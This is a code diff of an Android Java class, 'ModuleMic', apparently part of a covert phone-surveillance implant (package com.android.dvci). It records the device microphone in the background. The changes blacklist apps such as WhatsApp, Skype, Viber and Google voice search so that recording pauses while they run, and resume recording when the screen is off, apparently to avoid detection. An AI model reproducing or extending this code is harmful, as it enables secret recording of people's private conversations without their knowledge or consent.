@@ -16,6 +16,7 @@ import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
+import android.os.PowerManager;
 import android.speech.RecognizerIntent;
 
 import com.android.dvci.Call;
@@ -72,10 +73,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	private Observer<ProcessInfo> processObserver;
 
 	public Set<String> blacklist = new HashSet<String>();
-
+	private PowerManager pm = null;
 	public ModuleMic() {
 		super();
 		resetBlacklist();
+		pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
+
 	}
 	public boolean isRecording() {
 		return recorder_started;
@@ -90,13 +93,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		addBlacklist(M.e("com.andrwq.recorder"));
 		addBlacklist(M.e("com.skype.raider"));
 		addBlacklist(M.e("com.viber.voip"));
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()){
-				addBlacklist(M.e("googlequicksearchbox:search"));
-			}else{
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(resetBlacklist)voice Recognition not present");//$NON-NLS-1$
-				}
+		addBlacklist(M.e("com.whatsapp"));
+		if (isSpeechRecognitionActivityPresented()) {
+			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(resetBlacklist)voice Recognition not present");//$NON-NLS-1$
 			}
 		}
 	}
@@ -165,7 +167,11 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 				standbyObserver = new StandByObserver(this);
 			}
 
-
+			addPhoneListener();
+			if (Cfg.DEBUG) {
+				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
+			}
+			ListenerStandby.self().attach(standbyObserver);
 			if (canRecordMic()) {
 				startRecord();
 
@@ -193,11 +199,6 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	}
 
 	private void startRecord() throws IOException {
-		addPhoneListener();
-		if (Cfg.DEBUG) {
-			Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
-		}
-		ListenerStandby.self().attach(standbyObserver);
 		// todo: sync
 		specificStart();
 	}
@@ -240,21 +241,6 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	public void actualGo() {
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
-		}
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()) {
-				if (!inInBlacklist(M.e("googlequicksearchbox:search"))) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(resetBlacklist)voice Recognition present ADDING in blacklist");//$NON-NLS-1$
-					}
-					addBlacklist(M.e("googlequicksearchbox:search"));
-				}
-			}else if(inInBlacklist(M.e("googlequicksearchbox:search"))){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(resetBlacklist)voice Recognition not present REMOVING from blacklist");//$NON-NLS-1$
-				}
-				delBlacklist(M.e("googlequicksearchbox:search"));
-			}
 		}
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualGo), recorder=" + recorder + "is recording=" + isRecording());
@@ -308,7 +294,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	@Override
 	public void notifyStop(String b, boolean add) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notifyStop): " + b + "add="+add);
+			Check.log(TAG + " (notifyStop): " + b + "add= "+add);
 		}
 		if(add){
 			suspend();
@@ -482,8 +468,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	public int notification(Standby b) {
 		if (b.isScreenOff()) {
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) standby, resume mic");
+				Check.log(TAG + " (notification) standby, resume mic, remove OK_GOOGLE stop if present");
+			}
+			if(inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+				removeStop(Status.STOP_REASON_OK_GOOGLE);
 			}
 			if(canRecordMic()) {
 				resume();
@@ -498,20 +488,39 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	}
 
 	private boolean isForegroundBlacklist() {
+
 		String foreground = Status.self().getForeground();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (isForegroundBlacklist) checking \""+foreground+"\'");
+		}
 		for (String bl : blacklist) {
 			if (foreground.contains(bl)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
 				}
-				if(!inStoplist(STOP_REASON_PROCESS)) {
-					addStop(STOP_REASON_PROCESS);
+				if (foreground.contains(Status.OK_GOOGLE_ACTIVITY)) {
+					if (pm != null && !pm.isScreenOn()) {
+						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
+						return false;
+					}
+					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+						addStop(Status.STOP_REASON_OK_GOOGLE);
+					}
+
+				} else {
+					if (!inStoplist(STOP_REASON_PROCESS)) {
+						addStop(STOP_REASON_PROCESS);
+					}
 				}
 				return true;
 			}
 		}
 		if(inStoplist(STOP_REASON_PROCESS)) {
 			removeStop(STOP_REASON_PROCESS);
+		}
+		if (inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+			removeStop(Status.STOP_REASON_OK_GOOGLE);
 		}
 		return false;
 	}
